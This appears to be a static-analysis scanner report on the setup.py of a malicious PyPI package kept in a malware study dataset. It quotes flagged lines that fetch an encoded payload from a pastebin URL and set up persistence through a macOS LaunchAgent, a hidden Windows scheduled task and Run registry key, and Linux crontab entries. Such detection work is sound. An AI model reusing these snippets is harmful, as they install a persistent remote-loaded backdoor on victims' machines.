Run started:2025-04-13 09:26:07.975281

Test results:
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:9
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
8	
9	macos_persist = '''<?xml version="1.0" encoding="UTF-8"?>
10	<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
11	<plist version="1.0">
12	<dict>
13	<key>Label</key>
14	<string>com.dortania.onecore.plist</string>
15	<key>ProgramArguments</key>
16	<array>
17	<string>''' + '/Users/' + os.getlogin() + '/.config/dconf/autostart/.update' + ''''</string>
18	</array>

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:24
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
23	
24	loader = '''
25	import urllib3,base64
26	url = 'https://pastebin.com/raw/VvkKsmxr'
27	http = urllib3.PoolManager()
28	resp = http.request('GET',url)
29	print(base64.b64decode(resp.data.decode('utf-8')).decode('utf-8'))
30	'''
31	
32	win_mutex = '''

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:66
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
65	    write_package('C:\\ProgramData\\update.py')
66	    os.system('attrib +h C:\\ProgramData\\update.py')
67	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '): #ADD SCRIPT PATH

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:66
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
65	    write_package('C:\\ProgramData\\update.py')
66	    os.system('attrib +h C:\\ProgramData\\update.py')
67	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '): #ADD SCRIPT PATH

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:67
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
66	    os.system('attrib +h C:\\ProgramData\\update.py')
67	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '): #ADD SCRIPT PATH
68	        os.system(r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PythonUpdate /t REG_SZ /d "{pythonpath} C:\ProgramData\update.py"')

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:67
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
66	    os.system('attrib +h C:\\ProgramData\\update.py')
67	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '): #ADD SCRIPT PATH
68	        os.system(r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PythonUpdate /t REG_SZ /d "{pythonpath} C:\ProgramData\update.py"')

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:68
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
67	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '): #ADD SCRIPT PATH
68	        os.system(r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PythonUpdate /t REG_SZ /d "{pythonpath} C:\ProgramData\update.py"')
69	def linux():

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:68
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
67	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '): #ADD SCRIPT PATH
68	        os.system(r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PythonUpdate /t REG_SZ /d "{pythonpath} C:\ProgramData\update.py"')
69	def linux():

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:79
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
78	    write_package(path)
79	    if os.system("echo '* */1 * * * " + pythonpath + " " + path + " ' | crontab -") != 0:
80	        try:

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:79
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
78	    write_package(path)
79	    if os.system("echo '* */1 * * * " + pythonpath + " " + path + " ' | crontab -") != 0:
80	        try:

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:84
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
83	                    with open('/var/spool/cron/crontabs/' + file,'a') as fd:
84	                        fd.write('* */1 * * * ' + pythonpath + ' ' + path)
85	                        break

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:100
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
99	    write_package(path)
100	    if os.system("echo '* */1 * * * " + pythonpath + " " + path + " ' | crontab -") != 0:
101	        try:

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:100
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
99	    write_package(path)
100	    if os.system("echo '* */1 * * * " + pythonpath + " " + path + " ' | crontab -") != 0:
101	        try:

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:103
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
102	            with open('/Library/LaunchAgents/com.dortania.onecore.plist','w') as fd:
103	                fd.write(macos_persist)
104	        except:

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:117
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
116	    write_package(path)
117	    os.system(pythonpath + ' ' + path)
118	

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:117
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
116	    write_package(path)
117	    os.system(pythonpath + ' ' + path)
118	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/test_package_main_dist-999010119.1.0/test_package_main_dist-999010119.1.0/setup.py:123
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
122	    with open(path,'w') as of:
123	        of.write(data)
124	

--------------------------------------------------

Code scanned:
	Total lines of code: 133
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 8.0
		High: 9.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 11.0
		High: 6.0
Files skipped (0):
